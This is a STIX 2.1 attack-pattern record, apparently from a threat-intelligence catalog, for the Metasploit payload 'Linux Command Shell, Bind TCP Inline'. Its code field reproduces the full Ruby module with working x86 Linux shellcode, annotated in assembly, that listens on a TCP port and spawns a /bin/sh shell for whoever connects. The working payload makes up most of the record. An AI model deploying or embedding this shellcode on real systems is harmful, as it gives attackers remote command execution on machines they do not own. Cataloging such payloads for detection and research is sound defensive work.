{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e36dff16-8fa9-4cf3-b5ff-991dd41d566b",
    "created": "2024-08-14T16:33:19.432872Z",
    "modified": "2024-08-14T16:33:19.432876Z",
    "name": "Linux Command Shell, Bind TCP Inline",
    "description": "Listen for a connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 78\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Inline',\n      'Description'   => 'Listen for a connection and spawn a command shell',\n      'Author'        => 'Ramon de C Valle',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LPORT'    => [ 21, 'n' ],\n            },\n          # TODO: Payload source needs serious cleanup. This payload was\n          # originally generated from\n          # external/source/unixasm/lin-x86-bndsockcode.s which supposedly\n          # worked when it was initially committed. Nevertheless, it was\n          # calling bind(2) with insane parameters, which ended up erroring out\n          # and causing execution to fall off the end of the shellcode,\n          # bursting into flames. See #7216, #7224\n          'Payload' =>\n            \"\\x31\\xdb\"             + #   xorl    %ebx,%ebx                  #\n            \"\\xf7\\xe3\"             + #   mull    %ebx                       #\n            \"\\x53\"                 + #   pushl   %ebx                       #\n            \"\\x43\"                 + #   incl    %ebx                       #\n            \"\\x53\"                 + #   pushl   %ebx                       #\n            \"\\x6a\\x02\"             + #   pushl   $0x02                      #\n            \"\\x89\\xe1\"             + #   movl    %esp,%ecx                  #\n            \"\\xb0\\x66\"             + #   movb    $0x66,%al                  #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\x5b\"                 + #   popl    %ebx                       #\n            \"\\x5e\"                 + #   popl    %esi                       #\n            \"\\x52\"                 + #   pushl   %edx                       #\n            \"\\x68\\x02\\x00\\x04\\xd2\" + #   pushl   $0xd2040200                #\n            \"\\x6a\\x10\"             + #   pushl   $0x10                      #\n            \"\\x51\"                 + #   pushl   %ecx                       #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x89\\xe1\"             + #   movl    %esp,%ecx                  #\n            \"\\x6a\\x66\"             + #   pushl   $0x66                      #\n            \"\\x58\"                 + #   popl    %eax                       #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\x89\\x41\\x04\"         + #   movl    %eax,0x04(%ecx)            #\n            \"\\xb3\\x04\"             + #   movb    $0x04,%bl                  #\n            \"\\xb0\\x66\"             + #   movb    $0x66,%al                  #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\x43\"                 + #   incl    %ebx                       #\n            \"\\xb0\\x66\"             + #   movb    $0x66,%al                  #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\x93\"                 + #   xchgl   %eax,%ebx                  #\n            \"\\x59\"                 + #   popl    %ecx                       #\n            \"\\x6a\\x3f\"             + #   pushl   $0x3f                      #\n            \"\\x58\"                 + #   popl    %eax                       #\n            \"\\xcd\\x80\"             + #   int     $0x80                      #\n            \"\\x49\"                 + #   decl    %ecx                       #\n            \"\\x79\\xf8\"             + #   jns     <bndsockcode+50>           #\n            \"\\x68\\x2f\\x2f\\x73\\x68\" + #   pushl   $0x68732f2f                #\n            \"\\x68\\x2f\\x62\\x69\\x6e\" + #   pushl   $0x6e69622f                #\n            \"\\x89\\xe3\"             + #   movl    %esp,%ebx                  #\n            \"\\x50\"                 + #   pushl   %eax                       #\n            \"\\x53\"                 + #   pushl   %ebx                       #\n            \"\\x89\\xe1\"             + #   movl    %esp,%ecx                  #\n            \"\\xb0\\x0b\"             + #   movb    $0x0b,%al                  #\n            \"\\xcd\\x80\"               #   int     $0x80                      #\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}